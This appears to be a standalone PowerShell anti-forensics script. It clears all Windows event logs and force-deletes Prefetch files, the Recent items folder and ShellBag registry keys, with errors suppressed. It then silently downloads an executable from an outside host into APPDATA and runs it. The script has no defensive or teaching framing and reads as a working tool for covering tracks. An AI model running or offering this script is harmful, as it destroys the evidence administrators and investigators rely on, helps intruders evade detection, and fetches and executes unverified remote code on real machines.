# PowerShell Function/Cmdlet to clear all of Logs
Function Clear-WinEvent {
    [CmdletBinding(SupportsShouldProcess = $True)]
    Param
    ([String]$LogName)
    Process {
        If ($PSCmdlet.ShouldProcess("$LogName", "Clear log file")) {
            [System.Diagnostics.Eventing.Reader.EventLogSession]::`
                GlobalSession.ClearLog("$LogName")
        }
    }
}

function clear-all-event-logs ()
{
   $logs = Get-EventLog  -List | ForEach-Object {$_.Log}
   $logs | ForEach-Object {Clear-EventLog -LogName $_ }
}

Get-WinEvent -ListLog * | ForEach-Object {Clear-WinEvent -LogName $_.LogName -ErrorAction SilentlyContinue}

clear-all-event-logs


# clear shell Bags
Remove-Item -Recurse -Force C:\Windows\Prefetch\*.pf -ea 0
Remove-Item -Recurse -Force $env:APPDATA\Microsoft\Windows\Recent -ea 0 
Remove-Item -Recurse -Force 'HKCU:\SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\Shell\BagMRU\' -ea 0
Remove-Item -Recurse -Force 'HKCU:\SOFTWARE\Classes\Local Settings\Software\Microsoft\Windows\Shell\Bags' -ea 0
write-Host -ForegroundColor Green "log clear "

$ProgressPreference = 'SilentlyContinue'

$url = "http://utools.run/shellbag_analyzer_cleaner.exe"

curl -Uri $url -OutFile $env:APPDATA\shellbag_analyzer_cleaner.exe

& $env:APPDATA\shellbag_analyzer_cleaner.exe

